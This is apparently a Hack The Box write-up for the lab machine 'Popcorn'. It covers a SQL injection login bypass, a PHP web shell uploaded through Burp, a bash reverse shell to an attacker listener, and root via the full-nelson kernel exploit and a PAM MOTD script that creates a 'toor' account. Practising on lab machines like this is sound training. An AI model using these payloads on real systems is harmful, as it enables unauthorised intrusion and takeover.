---
title:     "Hack The Box - Popcorn"
tags: [HackTheBox,Linux,Medium]
layout: post
categories: HackTheBox-Writeups
---

![](/images/HTB/Popcorn/popcorn.png)

# Introduction

Popcorn is a medium rated Hack The Box machine where we can take advantage of a file upload to allow us to upload some php files for a user shell, and it has a couple of ways to get root. There are a couple of extras in this machine that aren't needed to root the box, but as curious hackers it's good to find them. Let's get started!


# Initial Enumeration

## Nmap scan
```
# Nmap 7.92 scan initiated Thu Feb  3 18:42:54 2022 as: nmap -T3 -Pn -O -p T:22,80 -sV --script=default,http-vuln-cve2010-0738.nse,http-vuln-cve2011-3192.nse,http-vuln-cve2014-2126.nse,http-vuln-cve2014-2127.nse,http-vuln-cve2014-2128.nse,http-vuln-cve2014-2129.nse,http-vuln-cve2015-1635.nse,http-vuln-cve2017-1001000.nse -oN /storage/HackTheBox/Popcorn/scans/nmap_vuln_10.10.10.6.scan 10.10.10.6
Nmap scan report for 10.10.10.6
Host is up (0.0093s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       https://www.tenable.com/plugins/nessus/55976
|       https://www.securityfocus.com/bid/49303
|_      https://seclists.org/fulldisclosure/2011/Aug/175
|_http-server-header: Apache/2.2.12 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.17 - 2.6.36 (95%), Linux 2.6.30 (95%), Linux 2.6.32 (95%), Linux 2.6.35 (95%), Linux 2.4.20 (Red Hat 7.2) (95%), Linux 2.6.17 (95%), AVM FRITZ!Box FON WLAN 7240 WAP (95%), Android 2.3.5 (Linux 2.6) (95%), Canon imageRUNNER ADVANCE C3320i or C3325 copier (94%), Epson WF-2660 printer (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb  3 18:43:04 2022 -- 1 IP address (1 host up) scanned in 10.92 seconds

```

## HTTP

The Nmap scan returns only SSH and HTTP so we know our attack vector is going to be somewhere on port 80. Browsing to the website gives us a default page so there isn't much to work with.

![](/images/HTB/Popcorn/default_page.png)

Seeing that there is nothing hidden in the source code and that robots.txt does not exist it's time for some directory busting with feroxbuster.

![](/images/HTB/Popcorn/ferox_scan.png)

Feroxbuster comes back with a few links for us to check out. The `/test` directory brings us to a phpinfo page that leaks a bunch of information about the server but otherwise there is nothing we can do here. The `/rename` directory brings us to a file renamer and gives us the syntax to use it. Since we don't actually need this to root the box I'll leave playing around with it in a bonus section at the end. The final directory we find is `/torrent` which brings us to a torrent hoster site.

![](/images/HTB/Popcorn/torrent_hoster.png)

The upload section instantly catches the eye however you need a login to access it. The site is nice enough to let us sign up, but before we do that let's check for SQL injection. We could hand this to sqlmap to be thorough but I generally try a couple of things before going there. We know from the home page that there were news articles posted by `admin` so it is likely the admin user exists. With that in mind I decided my payload would be `admin' OR 1=1;-- -` in both the username and password field. After sending that we are instantly logged in as admin. We don't actually need the admin part when doing the SQL injection, using only `' OR 1=1;-- -` for the username and any password works as well.

![](/images/HTB/Popcorn/torrent_admin_page.png)

Becoming the admin user is another one of those things that is really not necessary to help solve the box but is still a cool find. I attempted to add some PHP to a new post on the home page but it appears PHP does not get executed. I guess one thing that being admin allows us to do is bypass the steps of registering a user and uploading a torrent. 

# Getting user

The first steps of getting user are either registering a new user and uploading a torrent, or since we are the admin user and they are the one who uploaded the kali torrent we can just edit that. 

![](/images/HTB/Popcorn/torrent_edit.png)

From here we see that we can upload a screenshot that is either a jpg, jpeg, gif, png. If we ignore this and try to upload a php file we get the error `Invalid file` so let's play around and see what we can get away with. The first thing I wanted to check was what a successful file upload looks like, so I uploaded a small .gif file.

![](/images/HTB/Popcorn/torrent_upload_success.png)

Sure enough after refreshing the page the gif appears in the screenshots. Furthermore if we right click on our new screenshot and open it in a new tab we get the location that the file was placed.

![](/images/HTB/Popcorn/torrent_upload_location.png)

Now that we know we can successfully upload files let's bring this upload request into burpsuite and play around with it.

![](/images/HTB/Popcorn/burp_good_upload.png)

I'm going to start by changing the filename from `load.gif` to `load.php`. If we are able to upload files with a .php extension our life should be pretty easy. If not maybe we can use that file renamer we found during our initial enumeration. As it turns out the website will happily accept a .php file.

![](/images/HTB/Popcorn/burp_test_php.png)

We now know that the upload is not blocking files based on the extension. We can assume that it is either blocking them based on the Content-Type or by the magic bytes of the file. Since the Content-Type of image/gif clearly works I'm going to leave that alone and try modifying the file contents that are being uploaded. Changing the file data to `<?php system($_REQUEST['cypher']); ?>` should allow us to execute commands so lets give it a shot.

![](/images/HTB/Popcorn/burp_webshell_upload.png)

Looking good! Now let's see if this will run commands.

![](/images/HTB/Popcorn/webshell.png)

Awesome. Lets convert this to a shell on the machine by passing the command `bash -c 'bash -i >& /dev/tcp/10.10.14.22/6868 0>&1'` while making sure to have a netcat listener going. I'm going to do this within burpsuite and make it a post request to make it easier to read and to make sure we have the proper url encoding done.

![](/images/HTB/Popcorn/user_shell.png)

We now have a shell and can grab the user flag.

# Getting root (kernel exploit)

Doing some quick manual enumeration and checking `uname -a` shows us an extremely outdated kernel `Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux` which can likely be exploited. There is a nice GitHub (link below in references section) of old linux kernel exploits that I like to check. Looking for `2.6.31-14` brings up a few exact matches, the first being full-nelson. It has specifically Ubuntu 9.10 and 10.10 and we can verify that this matches our system by running `cat /etc/issue`.

![](/images/HTB/Popcorn/kernel_os_info.png)

Since we have an exact match for everything this looks very promising. This github provides us with the source code as well as pre-compiled binaries. Since we have an exact match I'm going to be lazy and download the precompiled 32 bit version (uname -a reports i686 which is 32bit) to use. We can grab that with `wget https://github.com/lucyoa/kernel-exploits/raw/master/full-nelson/full-nelson` and host it from our machine with `python3 -m http.server 80`. Now we can grab the file on popcorn, make it executable, and run it.

![](/images/HTB/Popcorn/owned.png)

Now we can grab the root flag from `/root/root.txt`

# Getting root (PAM MOTD)

If we look around in george's home directory we find `.cache/motd.legal-displayed` which is not something I'm not used to seeing. This file is empty, however if we check searchsploit using `searchsploit motd` it comes back with two Linux PAM 1.1.0 exploits for Ubuntu 9.10. Again we know we are on 9.10 by checking `cat /etc/issue` so this is a good sign. Looking at 14273.sh (`searchsploit -x linux/local/14273.sh`) it actually tells us that the updated script is `14339.sh` so we can move directly to that one.

Looking at 14339.sh we see that this script is going to make an .ssh key for our current user, take ownership of /etc/passwd and /etc/shadow, create the user toor with password toor, then clean itself up. If we check /etc/passwd ourselves we see that our current user, www-data, has a login shell, and we know we can write into the home directory of /var/www/ so this should work fine. We can save the script with `searchsploit -m linux/local/14339.sh`, host the file with `python3 -m http.server 80`, grab the file over on popcorn with `wget 10.10.14.22/14339.sh` and execute the file with `bash 14339.sh`. The script executes and tells us to type `toor` for root, so we do and we become root.

![](/images/HTB/Popcorn/motd_root.png)

Boom.


# Bonus - /rename

The renamer ended up being unnecessary to solve the machine, but the curious hacker in us tells us to poke at it anyway. 

![](/images/HTB/Popcorn/rename_syntax.png)

The instructions tell us to use index.php and pass it the values of the old filename and the new filename. If we set `filename=index.php` and  set `newfilename=test.php` we get a message saying "OK!". Sure enough when we navigate back to `/rename` we now have a directory listing instead of instantly loading the index.php file that no longer exists.

![](/images/HTB/Popcorn/rename_to_test.png)

We can put this back to how it was originally with the new command `http://10.10.10.6/rename/test.php?filename=test.php&newfilename=index.php`. We can use path traversal with the renamer as well. So if we wanted to rename the the index.html file that resides in the base directory we can do that. As a matter of fact we can actually move files with the renamer. For example if we were to send `http://10.10.10.6/rename/index.php?filename=../index.html&newfilename=test.html` we would move the index.html file from `http://10.10.10.6/index.html` to `http://10.10.10.6/rename/test.html`.

Finally we can specify an absolute path for the renamer instead of using path traversal. Since we have phpinfo at `/test` we know that the website is located at `/var/www/`. So we could send `http://10.10.10.6/rename/index.php?filename=/var/www/index.html&newfilename=test.html` and be successful as well. Unfortunately trying to move /etc/passwd gives us a permission denied error so it looks like we are going to be limited to moving things around in `/var/www/`.

![](/images/HTB/Popcorn/rename_passwd.png)

Although this ended up not being needed it is still important to think about other ways that may have been possible to use this to our advantage.

# References 

- [GitHub - lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)

